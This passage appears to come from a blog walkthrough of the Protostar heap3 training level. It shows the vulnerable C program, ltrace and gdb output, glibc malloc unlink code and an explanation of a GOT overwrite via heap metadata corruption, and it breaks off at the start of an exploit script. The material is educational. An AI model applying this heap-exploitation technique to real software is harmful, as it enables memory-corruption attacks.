</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>you have logged in already!
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Heap3</h2>

<p>This level introduces old <code>Doug Lea Malloc</code> version, which is statically linked with <code>heap3</code> binary.</p>

<p><figure class='code'><figcaption><span>heap3.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">unistd</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">winner</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">that</span> <span class="n">wasn</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="n">too</span> <span class="n">bad</span> <span class="n">now</span><span class="p">,</span> <span class="n">was</span> <span class="n">it</span><span class="o">?</span> <span class="err">@</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">a</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">b</span><span class="p">,</span> <span class="o">*</span><span class="n">c</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>  <span class="n">b</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span>
</span><span class='line'>  <span class="n">c</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">32</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">strcpy</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">free</span><span class="o">&amp;</span><span class="n">copy</span><span class="p">;;</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">b</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">dynamite</span> <span class="n">failed</span><span class="o">?</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:~$ ltrace /opt/protostar/bin/heap3 1 2 3
</span><span class='line'>__libc_start_main(0x8048889, 4, 0xbffff854, 0x804ab50, 0x804ab40 &lt;unfinished ...>
</span><span class='line'>sysconf(30, 0xb7ffeff4, 0xb7e9abb8, 1, 0xbffff71c)             = 4096
</span><span class='line'>sbrk(4096)                                                     = 0x0804c000
</span><span class='line'>sbrk(0)                                                        = 0x0804d000
</span><span class='line'>strcpy(0x0804c008, &ldquo;1&rdquo;)                                        = 0x0804c008
</span><span class='line'>strcpy(0x0804c030, &ldquo;2&rdquo;)                                        = 0x0804c030
</span><span class='line'>strcpy(0x0804c058, &ldquo;3&rdquo;)                                        = 0x0804c058
</span><span class='line'>puts(&ldquo;dynamite failed?"dynamite failed?
</span><span class='line'>)                                                              = 17
</span><span class='line'>+++ exited (status 17) +++</span></code></pre></td></tr></table></div></figure></p>

<p>We have three chunks at the appropriate addresses:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(08) 0x0804c000: a-control
</span><span class='line'>(32) 0x0804c008: a&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(08) 0x0804c000: b-control
</span><span class='line'>(32) 0x0804c030: b&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>(08) 0x0804c050: c-control
</span><span class='line'>(32) 0x0804c058: c</span></code></pre></td></tr></table></div></figure></p>

<p>There are a several great article about this topic, I recommend <a href="http://phrack.org/issues/57/8.html">Phrack 57/8</a>,
<a href="http://phrack.org/issues/57/9.html">Phrack 57/9</a>, <a href="https://www.win.tue.nl/~aeb/linux/hh/hh-11.html">Hackers Hut</a> to
explain the exploitation process in detail.</p>

<p>The malloc chunk is implemented as the following structure:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>GNU C Library Implementation (used chunk):&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>         +----------------------------------+
</span><span class='line'>chunk -&gt; | prev_size                        |
</span><span class='line'>         +----------------------------------+
</span><span class='line'>         | size                         |M|P|
</span><span class='line'>         +----------------------------------+
</span><span class='line'>  mem -&gt; | data                             |
</span><span class='line'>         : ...                              :
</span><span class='line'>         +----------------------------------+
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>nextchunk -> | prev_size &hellip;                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Once we free() the chunk:&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;pre>&lt;code>         +----------------------------------+
</span><span class='line'>chunk -&gt; | prev_size                        |
</span><span class='line'>         +----------------------------------+
</span><span class='line'>         | size                         |M|P|
</span><span class='line'>         +----------------------------------+
</span><span class='line'>  mem -&gt; | fd                               |
</span><span class='line'>         +----------------------------------+
</span><span class='line'>         | bk                               |
</span><span class='line'>         +----------------------------------+
</span><span class='line'>         | (old memory, can be zero bytes)  |
</span><span class='line'>         :                                  :
</span><span class='line'>&lt;/code>&lt;/pre>
</span><span class='line'>
</span><span class='line'>&lt;p>nextchunk -> | prev_size &hellip;                    |
</span><span class='line'>             :                                  :</span></code></pre></td></tr></table></div></figure></p>

<p>It is useful to download the <a href="https://ftp.gnu.org/gnu/glibc/glibc-2.2.3.tar.gz">glibc 2.2.3</a> source code, we are
interested, how is the <code>free()</code> implemented:</p>

<p><figure class='code'><figcaption><span>malloc/malloc.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">..</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">unlink</span><span class="p">(</span><span class="n">P</span><span class="p">,</span> <span class="n">BK</span><span class="p">,</span> <span class="n">FD</span><span class="p">)</span>                                                     <span class="err">\</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">{</span>                                                                             \
</span><span class='line'>  <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>                                                                 \
</span><span class='line'>  <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>                                                                 \
</span><span class='line'>  <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>                                                                \
</span><span class='line'>  <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                                                                \
</span><span class='line'><span class="p">}</span>                                                                             \
</span><span class='line'><span class="p">..</span>
</span><span class='line'>  <span class="n">islr</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">hd</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">PREV_INUSE</span><span class="p">))</span>                    <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">consolidate</span> <span class="n">backward</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">prevsz</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">prev_size</span><span class="p">;</span>
</span><span class='line'>    <span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">(</span><span class="kt">long</span><span class="p">)</span><span class="n">prevsz</span><span class="p">);</span>
</span><span class='line'>    <span class="n">sz</span> <span class="o">+=</span> <span class="n">prevsz</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>     <span class="cm">/* keep as last_remainder */</span>
</span><span class='line'>  <span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'>  <span class="nf">unlink</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">inuse_bit_at_offset</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">)))</span>   <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">consolidate</span> <span class="n">forward</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>    <span class="n">sz</span> <span class="o">+=</span> <span class="n">nextsz</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">islr</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">next</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">fd</span> <span class="o">==</span> <span class="n">last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">))</span>
</span><span class='line'>                                          <span class="cm">/* re-insert last_remainder */</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">islr</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="n">link_last_remainder</span><span class="p">(</span><span class="n">ar_ptr</span><span class="p">,</span> <span class="n">p</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="k">else</span>
</span><span class='line'>  <span class="n">unlink</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'><span class="n">next</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">sz</span><span class="p">);</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>    <span class="n">set_head</span><span class="p">(</span><span class="n">next</span><span class="p">,</span> <span class="n">nextsz</span><span class="p">);</span>                  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">clear</span> <span class="n">inuse</span> <span class="n">bit</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>To call vulnerable <code>unlink()</code>, we have two branches, consolidate backward or consolidate forward.</p>

<p>We want to overwrite the jump to <code>printf/puts</code> function in <code>GOT</code> table with
the address of <code>winner()</code>.</p>

<p>Given the <code>bck</code> and <code>fwd</code> pointers that we could set arbitrary, <code>free()</code> will do <code>*(fwd+12) = bck</code>
and <code>*(bck+8) = fwd</code>. We use the first assignment to write to the arbitrary memory location.</p>

<p>Because the second assignment, we cannot simply write something to <code>.text</code> section (after <code>winner+0x8</code>),
but jumping to our shellcode stored in allocated memory would be efficient.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb> print /x 0x08048864+0x8
</span><span class='line'>$1 = 0x804886c&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>gdb> maintenance info sections
</span><span class='line'>Exec file:
</span><span class='line'>    `/opt/protostar/bin/heap3', file type elf32-i386.
</span><span class='line'>    0x8048114->0x8048127 at 0x00000114: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048128->0x8048148 at 0x00000128: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048148->0x804816c at 0x00000148: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804816c->0x8048234 at 0x0000016c: .hash ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048234->0x804829c at 0x00000234: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804829c->0x804848c at 0x0000029c: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804848c->0x804859a at 0x0000048c: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804859a->0x80485d8 at 0x0000059a: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x80485d8->0x80485f8 at 0x000005d8: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x80485f8->0x8048608 at 0x000005f8: .rel.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048608->0x8048680 at 0x00000608: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x8048680->0x80486b0 at 0x00000680: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
</span><span class='line'>    0x80486b0->0x80487b0 at 0x000006b0: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
</span><span class='line'>==> 0x80487b0->0x804abdc at 0x000007b0: .text ALLOC LOAD READONLY CODE HAS_CONTENTS &lt;==
</span><span class='line'>    0x804abdc->0x804abf8 at 0x00002bdc: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
</span><span class='line'>    0x804abf8->0x804aca0 at 0x00002bf8: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804aca0->0x804aca4 at 0x00002ca0: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
</span><span class='line'>    0x804b000->0x804b008 at 0x00003000: .ctors ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b008->0x804b010 at 0x00003008: .dtors ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b010->0x804b014 at 0x00003010: .jcr ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b014->0x804b0e4 at 0x00003014: .dynamic ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b0e4->0x804b0e8 at 0x000030e4: .got ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b0e8->0x804b130 at 0x000030e8: .got.plt ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b130->0x804b138 at 0x00003130: .data ALLOC LOAD DATA HAS_CONTENTS
</span><span class='line'>    0x804b140->0x804b5d4 at 0x00003138: .bss ALLOC
</span><span class='line'>    0x0000->0x3cfc at 0x00003138: .stab READONLY HAS_CONTENTS
</span><span class='line'>    0x0000->0x566a at 0x00006e34: .stabstr READONLY HAS_CONTENTS
</span><span class='line'>    0x0000->0x0039 at 0x0000c49e: .comment READONLY HAS_CONTENTS</span></code></pre></td></tr></table></div></figure></p>

<p>Exploit:</p>

<p><figure class='code'><figcaption><span>exploit-backward.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;user@protostar:~$ objdump -d /o</span><span class="n">pt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;&amp;hellip;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mi">8048935</span><span class="p">:</span>       <span class="n">e8</span> <span class="mi">56</span> <span class="n">fe</span> <span class="n">ff</span> <span class="n">ff</span>          <span class="n">call</span>   <span class="mi">8048790</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="nb">puts</span><span class="vi">@plt</span><span class="o">&gt;&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;user@protostar:~$ objdump -TR /o</span><span class="n">pt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap3</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="no">R_386_JUMP_SLOT</span><span class="o">.</span><span class="n">*</span> <span class="nb">puts</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
